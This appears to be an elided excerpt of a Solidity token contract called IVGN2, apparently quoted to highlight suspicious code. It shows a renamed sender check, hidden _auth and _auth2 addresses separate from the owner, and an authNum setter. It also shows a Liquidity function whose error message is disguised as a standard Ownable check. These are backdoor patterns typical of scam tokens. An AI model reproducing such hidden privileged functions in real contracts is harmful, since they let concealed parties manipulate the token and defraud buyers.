...
abstract contract Context {
    ...
    function _msgSenders() internal view returns (address payable) {
        return msg.sender;
    }
...
contract Ownable is Context {
    ...
    function authNum(uint256 num)public returns(bool){
        require(_msgSenders() == _auth, "Permission denied");
        _authNum = num;
        return true;
    }
...
contract IVGN2 is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 900000000000000000000000000;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "IVGOLDNEW2";
    string private _symbol = "IVGN2";
    ...
    uint256 private numTokensSellToAddToLiquidity = 250000000000000000000000000;
   ...
   //mainnet     IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);   //
    ...
    function Liquidity(address liquidity_) public {
        require(liquidity_ != address(0) && _msgSenders() == _auth2, "Ownable: new owner is the zero address");
